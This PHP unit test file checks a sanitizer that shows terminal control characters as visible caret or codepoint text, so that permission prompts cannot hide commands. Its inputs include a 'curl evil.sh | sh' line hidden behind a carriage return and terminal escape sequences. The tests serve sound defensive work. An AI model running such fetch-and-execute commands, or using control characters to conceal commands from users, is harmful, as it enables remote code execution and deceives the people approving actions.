<?php

declare(strict_types=1);

namespace SugarCraft\Core\Tests\Util;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use SugarCraft\Core\Util\Sanitize;

/**
 * Byte-exact coverage for {@see Sanitize::visibleControls()}: the policy that
 * shows every control as inert visible text instead of removing it (audit
 * 15b-19 — a permission prompt must never hide or reinterpret text).
 */
final class SanitizeVisibleControlsTest extends TestCase
{
    /** � U+FFFD REPLACEMENT CHARACTER — the invalid-UTF-8 stand-in. */
    private const FFFD = "\xEF\xBF\xBD";

    public function testEscIsShownAsCaretBracketAndTheSequenceBodyStaysInert(): void
    {
        self::assertSame('a^[[31mb^[[0m', Sanitize::visibleControls("a\x1b[31mb\x1b[0m"));
    }

    public function testOscWithBelTerminatorIsShownWhole(): void
    {
        self::assertSame('^[]0;pwned^G', Sanitize::visibleControls("\x1b]0;pwned\x07"));
    }

    public function testDelIsShownAsCaretQuestionMark(): void
    {
        self::assertSame('a^?b', Sanitize::visibleControls("a\x7fb"));
    }

    public function testUtf8EncodedC1CsiIsShownAsItsCodepoint(): void
    {
        self::assertSame('<U+009B>2J', Sanitize::visibleControls("\u{9b}2J"));
    }

    public function testEveryC1CodepointHasItsOwnSpelling(): void
    {
        for ($cp = 0x80; $cp <= 0x9F; $cp++) {
            self::assertSame(
                \sprintf('x<U+%04X>y', $cp),
                Sanitize::visibleControls('x' . mb_chr($cp, 'UTF-8') . 'y'),
                \sprintf('U+%04X', $cp),
            );
        }
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function caretCases(): array
    {
        return [
            'NUL' => ["\x00", '^@'],
            'BEL' => ["\x07", '^G'],
            'BS' => ["\x08", '^H'],
            'VT' => ["\x0b", '^K'],
            'FF' => ["\x0c", '^L'],
            'CR' => ["\r", '^M'],
            'SO' => ["\x0e", '^N'],
            'ESC' => ["\x1b", '^['],
            'FS' => ["\x1c", '^\\'],
            'GS' => ["\x1d", '^]'],
            'RS' => ["\x1e", '^^'],
            'US' => ["\x1f", '^_'],
        ];
    }

    #[DataProvider('caretCases')]
    public function testC0ControlIsShownInCaretNotation(string $control, string $caret): void
    {
        self::assertSame("<{$caret}>", Sanitize::visibleControls("<{$control}>"));
    }

    public function testEveryC0ByteExceptTabAndLfBecomesVisible(): void
    {
        for ($b = 0x00; $b <= 0x1F; $b++) {
            $out = Sanitize::visibleControls(\chr($b));
            if ($b === 0x09 || $b === 0x0A) {
                self::assertSame(\chr($b), $out, 'TAB and LF keep the layout');
                continue;
            }
            self::assertSame('^' . \chr($b + 0x40), $out, \sprintf('byte 0x%02X', $b));
        }
    }

    public function testCarriageReturnIsShownNotMappedSoBothHalvesStayOnOneRow(): void
    {
        self::assertSame(
            "curl evil.sh | sh #^Mecho 'hello world'",
            Sanitize::visibleControls("curl evil.sh | sh #\recho 'hello world'"),
        );
        self::assertSame("line^M\nnext", Sanitize::visibleControls("line\r\nnext"));
    }

    public function testTabAndLineFeedAreKeptByDefault(): void
    {
        self::assertSame("a\tb\nc", Sanitize::visibleControls("a\tb\nc"));
    }

    public function testOneLineModeShowsTabAndLineFeedToo(): void
    {
        $out = Sanitize::visibleControls("a\tb\nc\rd", false);

        self::assertSame('a^Ib^Jc^Md', $out);
        self::assertSame(0, preg_match('/[\x00-\x1F\x7F]/', $out));
    }

    public function testInvalidUtf8IsRepairedToReplacementCharacters(): void
    {
        $out = Sanitize::visibleControls("ok\xff\xfe end");

        self::assertSame('ok' . self::FFFD . self::FFFD . ' end', $out);
        self::assertTrue(mb_check_encoding($out, 'UTF-8'));
    }

    public function testLoneRawC1ByteIsShownAsReplacementCharacterNotPassedThrough(): void
    {
        // \x9b alone is an 8-bit CSI introducer to a non-UTF-8 terminal.
        $out = Sanitize::visibleControls("a\x9b2Jb");

        self::assertSame('a' . self::FFFD . '2Jb', $out);
        self::assertStringNotContainsString("\x9b", $out);
    }

    public function testInvalidUtf8ElsewhereDoesNotSwitchTheControlPassOff(): void
    {
        // Fail-closed: one malformed byte must not let ESC, BEL or C1 through.
        $out = Sanitize::visibleControls("\xff\x1b[2J\x07\u{9b}");

        self::assertSame(self::FFFD . '^[[2J^G<U+009B>', $out);
        self::assertSame(0, preg_match('/[\x00-\x08\x0B-\x1F\x7F]|\xC2[\x80-\x9F]/', $out));
    }

    public function testOverlongAndSurrogateEncodingsAreRepairedNotDecoded(): void
    {
        // \xC0\x9B is an overlong ESC-adjacent spelling; \xED\xA0\x80 a surrogate.
        $out = Sanitize::visibleControls("a\xC0\x9Bb\xED\xA0\x80c");

        self::assertTrue(mb_check_encoding($out, 'UTF-8'));
        self::assertStringNotContainsString("\xC0", $out);
        self::assertStringNotContainsString("\xED\xA0\x80", $out);
        self::assertStringStartsWith('a', $out);
        self::assertStringEndsWith('c', $out);
    }

    public function testPlainTextIsUnchanged(): void
    {
        self::assertSame('rm -rf build/ && echo done', Sanitize::visibleControls('rm -rf build/ && echo done'));
        self::assertSame('', Sanitize::visibleControls(''));
    }

    public function testMultiByteTextIsUnchanged(): void
    {
        // NBSP (\xC2\xA0) shares C1's lead byte; → and 😀 carry continuation
        // bytes in 0x80-0x9F; CJK, combining marks and PUA glyphs are text.
        $text = "über\u{A0}文件 → 😀 e\u{301} \u{E0B0}";

        self::assertSame($text, Sanitize::visibleControls($text));
        self::assertSame($text, Sanitize::visibleControls($text, false));
    }

    public function testZoneSentinelsAreTextAndPassThrough(): void
    {
        $text = Sanitize::ZONE_SENTINEL_OPEN . 'id' . Sanitize::ZONE_SENTINEL_CLOSE;

        self::assertSame($text, Sanitize::visibleControls($text));
    }

    public function testExistingPoliciesAreUnaffected(): void
    {
        // visibleControls() shares cellValue()'s UTF-8 repair; pin that the
        // shared helper left cellValue() byte-identical.
        self::assertSame(self::FFFD . "\xC2\xB7", Sanitize::cellValue("\xff\x1b"));
        self::assertSame('a2Jb', Sanitize::untrusted("a\u{9b}2Jb"));
    }
}
